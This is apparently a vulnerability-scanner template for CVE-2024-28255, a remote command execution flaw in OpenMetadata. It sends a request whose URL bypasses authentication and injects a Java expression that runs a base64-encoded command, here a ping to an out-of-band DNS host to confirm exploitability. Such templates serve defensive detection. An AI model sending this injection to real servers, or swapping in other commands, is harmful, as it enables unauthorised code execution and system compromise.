id: CVE-2024-28255

info:
  name: OpenMetadata RCE
  author: laohuan12138
  severity: critical
  verified: true
  description: |-
    OpenMetadata 是一种一体化元数据管理平台，旨在提供一个统一的接口来查找和浏览各种数据集的元数据信息，并支持与其他数据工具和服务的集成,condition接口存在远程命令执行漏洞。
  reference:
    - https://mp.weixin.qq.com/s/CQg14kh1BMkMHDKKi9yufw
    - https://nvd.nist.gov/vuln/detail/CVE-2024-28255
  tags: rce,cve,cve2024
  created: 2024/4/11

set:
  oob: oob()
  oobDNS: oob.DNS
  cmd: base64("ping -c 4 "+oobDNS)
rules:
  r0:
    request:
      method: GET
      path: /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22{{cmd}}%22)))
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
